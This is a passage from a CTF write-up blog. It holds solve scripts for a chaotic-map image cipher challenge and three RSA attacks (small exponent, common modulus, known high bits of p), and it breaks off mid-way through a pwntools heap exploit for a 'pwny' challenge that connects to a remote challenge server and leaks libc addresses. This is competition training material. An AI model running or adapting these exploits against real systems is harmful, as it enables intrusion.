class="number">5</span>, <span class="number">201</span>, <span class="number">27</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">23</span>, <span class="number">175</span>, <span class="number">34</span>, <span class="number">156</span>, <span class="number">72</span>, <span class="number">208</span>, <span class="number">32</span>, <span class="number">195</span>, <span class="number">16</span>, <span class="number">127</span>, <span class="number">65</span>, <span class="number">207</span>, <span class="number">131</span>, <span class="number">57</span>, <span class="number">203</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">211</span>, <span class="number">21</span>, <span class="number">45</span>, <span class="number">132</span>, <span class="number">214</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">97</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">216</span>, <span class="number">74</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">165</span>, <span class="number">198</span>, <span class="number">72</span>, <span class="number">150</span>, <span class="number">94</span>, <span class="number">7</span>, <span class="number">177</span>, <span class="number">46</span>, <span class="number">226</span>, <span class="number">252</span>, <span class="number">247</span>, <span class="number">79</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">106</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">106</span>, <span class="number">236</span>, <span class="number">47</span>, <span class="number">145</span>, <span class="number">170</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">14</span>, <span class="number">152</span>, <span class="number">131</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">15</span>, <span class="number">168</span>, <span class="number">99</span>, <span class="number">115</span>, <span class="number">27</span>, <span class="number">220</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">170</span>, <span class="number">107</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">235</span>, <span class="number">129</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">217</span>, <span class="number">222</span>, <span class="number">36</span>, <span class="number">15</span>, <span class="number">217</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">192</span>, <span class="number">113</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">196</span>, <span class="number">13</span>, <span class="number">247</span>, <span class="number">148</span>, <span class="number">228</span>, <span class="number">225</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">133</span>, <span class="number">132</span>, <span class="number">238</span>, <span class="number">236</span>, <span class="number">127</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">150</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">213</span>, <span class="number">250</span>, <span class="number">141</span>, <span class="number">53</span>, <span class="number">114</span>, <span class="number">16</span>, <span class="number">198</span>, <span class="number">70</span>, <span class="number">133</span>, <span class="number">17</span>, <span class="number">247</span>, <span class="number">173</span>, <span class="number">136</span>, <span class="number">73</span>, <span class="number">236</span>, <span class="number">78</span>, <span class="number">188</span>, <span class="number">150</span>, <span class="number">239</span>, <span class="number">58</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">11</span>, <span class="number">122</span>, <span class="number">134</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">167</span>, <span class="number">137</span>, <span class="number">188</span>, <span class="number">55</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">245</span>, <span class="number">92</span>, <span class="number">160</span>, <span class="number">213</span>, <span class="number">254</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">69</span>, <span class="number">2</span>, <span class="number">140</span>, <span class="number">143</span>, <span class="number">155</span>, <span class="number">127</span>, <span class="number">236</span>, <span class="number">179</span>, <span class="number">199</span>, <span class="number">168</span>, <span class="number">35</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">174</span>]</span><br><span class="line">enc_flagimag=[<span class="number">198</span>, <span class="number">143</span>, <span class="number">247</span>, <span class="number">3</span>, <span class="number">152</span>, <span class="number">139</span>, <span class="number">131</span>, <span class="number">84</span>, <span class="number">181</span>, <span class="number">180</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">192</span>, <span class="number">25</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">136</span>, <span class="number">107</span>, <span class="number">190</span>, <span class="number">62</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">105</span>, <span class="number">238</span>, <span class="number">117</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">116</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">214</span>, <span class="number">171</span>, <span class="number">113</span>, <span class="number">209</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">194</span>, <span class="number">174</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">196</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">139</span>, <span class="number">135</span>, <span class="number">225</span>, <span class="number">214</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">178</span>, <span class="number">212</span>, <span class="number">185</span>, <span class="number">231</span>, <span class="number">204</span>, <span class="number">150</span>, <span class="number">204</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">142</span>, <span class="number">213</span>, <span class="number">173</span>, <span class="number">186</span>, <span class="number">166</span>, <span class="number">65</span>, <span class="number">238</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">25</span>, <span class="number">189</span>, <span class="number">148</span>, <span class="number">38</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">227</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">31</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">249</span>, <span class="number">86</span>, <span class="number">188</span>, <span class="number">86</span>, <span class="number">233</span>, <span class="number">41</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">7</span>, <span class="number">212</span>, <span class="number">234</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">245</span>, <span class="number">102</span>, <span class="number">227</span>, <span class="number">96</span>, <span class="number">160</span>, <span class="number">67</span>, <span class="number">181</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">192</span>, <span class="number">214</span>, <span class="number">210</span>, <span class="number">188</span>, <span class="number">84</span>, <span class="number">216</span>, <span class="number">215</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">233</span>, <span class="number">2</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">107</span>, <span class="number">251</span>, <span class="number">70</span>, <span class="number">128</span>, <span class="number">94</span>, <span class="number">190</span>, <span class="number">185</span>, <span class="number">210</span>, <span class="number">34</span>, <span class="number">85</span>, <span class="number">77</span>, <span class="number">29</span>, <span class="number">182</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">208</span>, <span class="number">228</span>, <span class="number">252</span>, <span class="number">73</span>, <span class="number">198</span>, <span class="number">151</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">97</span>, <span class="number">138</span>, <span class="number">235</span>, <span class="number">21</span>, <span class="number">117</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">129</span>, <span class="number">2</span>, <span class="number">253</span>, <span class="number">80</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">184</span>, <span class="number">220</span>, <span class="number">41</span>, <span class="number">82</span>, <span class="number">37</span>, <span class="number">140</span>, <span class="number">23</span>, <span class="number">143</span>, <span class="number">179</span>, <span class="number">53</span>, <span class="number">153</span>, <span class="number">113</span>, <span class="number">213</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">248</span>, <span class="number">65</span>, <span class="number">60</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">81</span>, <span class="number">48</span>, <span class="number">254</span>, <span class="number">251</span>, <span class="number">89</span>, <span class="number">195</span>, <span class="number">8</span>, <span class="number">93</span>, <span class="number">190</span>, <span class="number">66</span>, <span class="number">174</span>, <span class="number">97</span>, <span class="number">175</span>, <span class="number">210</span>, <span class="number">191</span>, <span class="number">66</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">128</span>, <span class="number">33</span>, <span class="number">230</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">239</span>, <span class="number">173</span>, <span class="number">44</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">231</span>, <span class="number">114</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">63</span>, <span class="number">103</span>, <span class="number">44</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">137</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">223</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">215</span>, <span class="number">133</span>, <span class="number">131</span>, <span class="number">240</span>, <span class="number">239</span>, <span class="number">224</span>, <span class="number">195</span>, <span class="number">140</span>, <span class="number">124</span>, <span class="number">70</span>, <span class="number">156</span>, <span class="number">221</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">9</span>, <span class="number">157</span>, <span class="number">99</span>, <span class="number">150</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">225</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">141</span>, <span class="number">135</span>, <span class="number">99</span>, <span class="number">18</span>, <span class="number">119</span>, <span class="number">63</span>, <span class="number">160</span>, <span class="number">6</span>, <span class="number">247</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">45</span>, <span class="number">199</span>, <span class="number">86</span>, <span class="number">193</span>, <span class="number">252</span>, <span class="number">21</span>, <span class="number">135</span>, <span class="number">32</span>, <span class="number">42</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">241</span>, <span class="number">49</span>, <span class="number">249</span>, <span class="number">182</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">155</span>, <span class="number">157</span>, <span class="number">61</span>, <span class="number">4</span>, <span class="number">246</span>, <span class="number">158</span>, <span class="number">52</span>, <span class="number">118</span>, <span class="number">242</span>, <span class="number">195</span>, <span class="number">54</span>, <span class="number">139</span>, <span class="number">232</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">11</span>, <span class="number">233</span>, <span class="number">58</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">137</span>, <span class="number">83</span>, <span class="number">145</span>, <span class="number">209</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">96</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">207</span>, <span class="number">29</span>, <span class="number">237</span>, <span class="number">124</span>, <span class="number">177</span>, <span class="number">166</span>, <span class="number">161</span>, <span class="number">20</span>, <span class="number">116</span>, <span class="number">122</span>, <span class="number">61</span>, <span class="number">71</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">112</span>, <span class="number">66</span>, <span class="number">94</span>, <span class="number">57</span>, <span class="number">221</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">192</span>, <span class="number">147</span>, <span class="number">5</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">174</span>, <span class="number">26</span>, <span class="number">160</span>, <span class="number">16</span>, <span class="number">188</span>, <span class="number">103</span>, <span class="number">187</span>, <span class="number">11</span>, <span class="number">238</span>, <span class="number">182</span>, <span class="number">144</span>, <span class="number">4</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">84</span>, <span class="number">100</span>, <span class="number">7</span>, <span class="number">239</span>, <span class="number">219</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">189</span>, <span class="number">166</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">141</span>, <span class="number">30</span>, <span class="number">198</span>, <span class="number">220</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">5</span>, <span class="number">45</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(x, r)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> round(r * x * (<span class="number">3</span> - x), <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    keys.append(testimage[i] ^ enc_testimag[i])</span><br><span class="line">c = Counter(keys)</span><br><span class="line"><span class="comment">#print(c.most_common(4))</span></span><br><span class="line"><span class="keyword">for</span> key1, key2 <span class="keyword">in</span> itertools.product([<span class="number">86</span>, <span class="number">169</span>], [<span class="number">78</span>, <span class="number">177</span>]):</span><br><span class="line">    chs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        ch = <span class="number">-1</span></span><br><span class="line">        <span class="keyword">if</span> enc_testimag[i]^testimage[i] == key1:</span><br><span class="line">            ch = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> enc_testimag[i]^testimage[i] == (~key1)&amp;<span class="number">0xff</span>:</span><br><span class="line">            ch = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> enc_testimag[i]^testimage[i] == key2:</span><br><span class="line">            ch = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> enc_testimag[i]^testimage[i] == (~key2)&amp;<span class="number">0xff</span>:</span><br><span class="line">            ch = <span class="number">3</span></span><br><span class="line">        chs.append(ch)</span><br><span class="line">    binch = <span class="string">''</span>.join([bin(ch)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">'0'</span>) <span class="keyword">for</span> ch <span class="keyword">in</span> chs])</span><br><span class="line">    seqs = [int(binch[i:i + <span class="number">16</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(binch), <span class="number">16</span>)]</span><br><span class="line">    rs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(seqs)):</span><br><span class="line">        x2 = seqs[i] / <span class="number">22000</span></span><br><span class="line">        x1 = seqs[i - <span class="number">1</span>] / <span class="number">22000</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = x2 / (x1 * (<span class="number">3</span> - x1))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        rs.append(r)</span><br><span class="line"></span><br><span class="line">key1 = <span class="number">169</span></span><br><span class="line">key2 = <span class="number">78</span></span><br><span class="line">r = <span class="number">1.2</span></span><br><span class="line">seqs = [<span class="number">47909</span>, <span class="number">47275</span>, <span class="number">48284</span>, <span class="number">46656</span>, <span class="number">49226</span>, <span class="number">45038</span>, <span class="number">51495</span>, <span class="number">40740</span>, <span class="number">56131</span>, <span class="number">30213</span>, <span class="number">58976</span>, <span class="number">22593</span>, <span class="number">53493</span>, <span class="number">36492</span>, <span class="number">58734</span>, <span class="number">23276</span>,</span><br><span class="line">        <span class="number">54242</span>, <span class="number">34786</span>, <span class="number">59225</span>, <span class="number">21883</span>, <span class="number">52659</span>, <span class="number">38317</span>, <span class="number">57857</span>, <span class="number">25696</span>, <span class="number">56490</span>, <span class="number">29302</span>, <span class="number">58654</span>, <span class="number">23501</span>, <span class="number">54478</span>, <span class="number">34236</span>, <span class="number">59316</span>, <span class="number">21623</span>]</span><br><span class="line">tmp = [round(seq / <span class="number">22000</span>, <span class="number">6</span>) <span class="keyword">for</span> seq <span class="keyword">in</span> seqs]</span><br><span class="line"></span><br><span class="line">v = round(tmp[<span class="number">0</span>], <span class="number">6</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    tmpv = v - <span class="number">1000</span> * <span class="number">0.000001</span> + i * <span class="number">0.000001</span></span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(seqs)):</span><br><span class="line">        <span class="keyword">if</span> int(seqs[j] != int(tmpv * <span class="number">22000</span>)):</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">        tmpv = generate(tmpv, r)</span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        <span class="keyword">print</span> (v - <span class="number">1000</span> * <span class="number">0.000001</span> + i * <span class="number">0.000001</span>)</span><br><span class="line"></span><br><span class="line">x = <span class="number">2.177698</span></span><br><span class="line">x0 = <span class="number">0.840264</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(seqs) - <span class="number">1</span>):</span><br><span class="line">    x = generate(x, r)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    x = generate(x, r)</span><br><span class="line">    seqs.append(int(x * <span class="number">22000</span>))</span><br><span class="line">bins = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> seq <span class="keyword">in</span> seqs:</span><br><span class="line">    binx = bin(seq)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> len(binx) &lt; <span class="number">16</span>:</span><br><span class="line">        binx = <span class="string">'0'</span> * (<span class="number">16</span> - len(binx)) + binx</span><br><span class="line">    bins += binx</span><br><span class="line">plain = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        index = <span class="number">16</span> * i + j</span><br><span class="line">        ch = int(bins[<span class="number">2</span> * index:<span class="number">2</span> * index + <span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">        pix = enc_flagimag[index]</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">            pix =( pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">            pix = (~pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">            pix = (pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">            pix = (~pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">        plain.append(pix)</span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span>.join(map(chr, plain))</span><br><span class="line"><span class="keyword">print</span> md5.new(data).hexdigest()</span><br></pre></td></tr></table></figure><h3 id="Rsa"><a href="#Rsa" class="headerlink" title="Rsa"></a>Rsa</h3><p>msg1:e=3，RSA的低加密指数攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = <span class="number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = <span class="number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009L</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>(gmpy2.iroot(c+i*n, <span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>):</span><br><span class="line">        res = gmpy2.iroot(c+i*n, <span class="number">3</span>)</span><br><span class="line">        ans = res[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">   i=i+<span class="number">1</span></span><br><span class="line"><span class="comment">#print(long_to_bytes(ans))</span></span><br><span class="line">msg1=long_to_bytes(ans)</span><br><span class="line"></span><br><span class="line">msg2:共模攻击</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line">c1=<span class="number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span></span><br><span class="line">n=<span class="number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L</span></span><br><span class="line">e1=<span class="number">17</span></span><br><span class="line">c2=<span class="number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span></span><br><span class="line">e2=<span class="number">65537</span></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = gmpy2.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = gmpy2.invert(c2, n)</span><br><span class="line">m = pow(c1,s1,n)*pow(c2,s2,n) % n</span><br><span class="line"><span class="comment">#print n2s(m)</span></span><br><span class="line">msg2 = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line">msg3高位攻击恢复p</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c3 = <span class="number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span></span><br><span class="line">e3 = <span class="number">65537</span></span><br><span class="line">n3 = </span><br><span class="line"><span class="number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sage求p</span></span><br><span class="line"></span><br><span class="line">p3 = <span class="number">11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span></span><br><span class="line">m3 = <span class="number">978430871477569051989776547659020359721056838635797362474311886436116962354292851181720060000979143571198378856012391742078510586927376783797757539078239088349758644144812898155106623543650953940606543822567423130350207207895380499638001151443841997176299548692737056724423631882</span></span><br><span class="line"></span><br><span class="line">q3 = n3 / p3</span><br><span class="line">phi3 = (p3<span class="number">-1</span>) * (q3<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e3,phi3)</span><br><span class="line">msg3 = pow(c3,d,n3)</span><br><span class="line"><span class="comment">#print(long_to_bytes(msg3))</span></span><br><span class="line">msg3=long_to_bytes(m3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line">text =msg1+msg2+msg3</span><br><span class="line"><span class="keyword">print</span> text</span><br><span class="line"><span class="keyword">print</span> md5.new(text).hexdigest()</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwny'</span>)</span><br><span class="line">r = remote(<span class="string">'124.70.2.166'</span>, <span class="number">23040</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all_in</span><span class="params">(idx, cont=<span class="string">''</span>, flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'choice: '</span>, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        r.send(str(cont))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(flag=<span class="number">0</span>, idx=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        r.sendlineafter(<span class="string">'choice: '</span>, <span class="string">'1'</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">'Index: '</span>, p64(idx))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendlineafter(<span class="string">'Index: '</span>, str(<span class="number">3</span>))</span><br><span class="line">        info(<span class="string">"FD is not 0!!!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    all_in(<span class="number">256</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">    <span class="comment"># gdb.attach(r, 'set *0x555555756860=0')</span></span><br><span class="line">    read(<span class="number">1</span>, <span class="number">0xfffffffffffffff0</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Result: '</span>)</span><br><span class="line">    libc_addr = int(r.recvuntil(<span class="string">'\n'</span>, drop=<span class="number">1</span>), <span class="number">16</span>) - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    <span class="keyword">if</span> libc_addr &lt; <span class="number">0</span>:</span><br><span class="line">        r.close()</span><br><span class="line">    malloc_hook = libc_addr + libc.sym[<span 